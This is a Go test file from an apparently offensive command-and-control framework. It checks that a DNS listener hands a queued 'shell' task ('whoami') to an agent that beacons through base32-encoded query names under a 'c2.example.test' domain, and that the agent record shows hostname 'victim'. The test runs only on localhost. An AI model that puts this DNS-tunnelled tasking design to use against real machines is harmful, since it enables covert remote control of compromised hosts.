package listener_test

import (
	"encoding/base32"
	"encoding/hex"
	"net"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/aelder202/sable/internal/listener"
	"github.com/aelder202/sable/internal/nonce"
	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
	mdns "github.com/miekg/dns"
)

func TestDNSHandlerDeliversQueuedTask(t *testing.T) {
	store := session.NewStore()
	store.Register(&session.Agent{
		ID:     "agent-1",
		Secret: testSecret,
	})
	if err := store.EnqueueTask("agent-1", &protocol.Task{ID: "dns-task", Type: "shell", Payload: "whoami"}); err != nil {
		t.Fatalf("EnqueueTask: %v", err)
	}

	domain := "c2.example.test."
	h := listener.NewDNSHandler(store, nonce.NewCache(5*time.Minute), domain)
	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("ListenPacket: %v", err)
	}
	defer pc.Close()

	srv := &mdns.Server{PacketConn: pc, Handler: h}
	errCh := make(chan error, 1)
	go func() {
		errCh <- srv.ActivateAndServe()
	}()
	defer func() {
		_ = srv.Shutdown()
		select {
		case err := <-errCh:
			if err != nil && !strings.Contains(err.Error(), "use of closed network connection") {
				t.Fatalf("DNS server returned error: %v", err)
			}
		case <-time.After(time.Second):
			t.Fatal("DNS server did not shut down")
		}
	}()

	body := makeBeacon(t, "agent-1", testSecret, time.Now().Unix())
	chunks := listener.ChunkForDNS(body)
	client := &mdns.Client{Net: "udp", Timeout: time.Second, UDPSize: 4096}

	var finalResp *mdns.Msg
	for i, chunk := range chunks {
		msg := new(mdns.Msg)
		msg.SetQuestion(dnsBeaconQName(chunk, i, len(chunks), "0123456789abcdef", "agent-1", domain), mdns.TypeA)
		msg.SetEdns0(4096, false)
		msg.RecursionDesired = false

		resp, _, err := client.Exchange(msg, pc.LocalAddr().String())
		if err != nil {
			t.Fatalf("DNS exchange chunk %d: %v", i, err)
		}
		finalResp = resp
	}

	if finalResp == nil || len(finalResp.Answer) == 0 {
		t.Fatal("expected final DNS chunk response to include a TXT answer")
	}

	var encodedTask []byte
	for _, rr := range finalResp.Answer {
		txt, ok := rr.(*mdns.TXT)
		if !ok {
			continue
		}
		decoded, err := hex.DecodeString(strings.Join(txt.Txt, ""))
		if err != nil {
			t.Fatalf("decode TXT response: %v", err)
		}
		encodedTask = append(encodedTask, decoded...)
	}
	if len(encodedTask) == 0 {
		t.Fatal("expected TXT answer to contain encoded task bytes")
	}

	task, err := protocol.DecodeTask(encodedTask, testSecret)
	if err != nil {
		t.Fatalf("DecodeTask: %v", err)
	}
	if task.ID != "dns-task" || task.Type != "shell" || task.Payload != "whoami" {
		t.Fatalf("unexpected DNS task: %+v", task)
	}

	agent, ok := store.Get("agent-1")
	if !ok {
		t.Fatal("agent missing after DNS beacon")
	}
	if agent.Hostname != "victim" || agent.OS != "linux" || agent.Arch != "amd64" || agent.LastSeen.IsZero() {
		t.Fatalf("agent metadata was not updated from DNS beacon: %+v", agent)
	}
}

func dnsBeaconQName(chunk []byte, idx, total int, sessionID, agentID, domain string) string {
	encoded := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk))
	return encoded + "." +
		padDNSNumber(idx) + "." +
		padDNSNumber(total) + "." +
		sessionID + "." +
		agentID + "." +
		domain
}

func padDNSNumber(value int) string {
	s := "0000" + strconv.Itoa(value)
	return s[len(s)-4:]
}
